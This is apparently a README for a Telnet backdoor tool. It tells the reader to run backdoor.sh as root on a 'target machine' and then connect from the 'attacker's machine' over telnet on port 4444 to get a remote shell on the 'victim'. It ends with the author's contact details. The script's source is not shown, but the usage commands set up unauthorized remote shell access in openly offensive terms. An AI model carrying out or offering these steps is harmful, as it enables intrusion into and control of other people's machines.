# Telnet Backdoor  
`Simple backdoor setup using Telnet for remote shell access.`

## Features

### 1. Backdoor Script  
- Download and execute the script on the **target machine** with root privileges or `chmod +x` to ensure proper execution.

### 2. Telnet Connection  
- Connect to the victim machine using Telnet from the **attacker's machine**.

## About  
`This setup allows for a reverse shell-like connection using Telnet, suitable for basic backdoor access in controlled environments.`

### Usage  
**1. On the target machine:**  
- Download the script  
- Grant execution permission:  
  - `chmod +x backdoor.sh`  
- Run the script as root:  
  - `sudo ./backdoor.sh`

**2. On the attacker’s machine:**  
> Start Telnet session:
- `telnet`  
> Enable binary mode:  
- `toggle binary`  
> Connect to victim:  
- `open 192.168.0.xxx 4444`

[You should now be successfully connected to the victim machine.]\
```Note: The port can be changed by modifying the backdoor.sh source code.```

---

`Telegram: t.me/oghbnz | E-mail: rhashibur75@gmail.com`
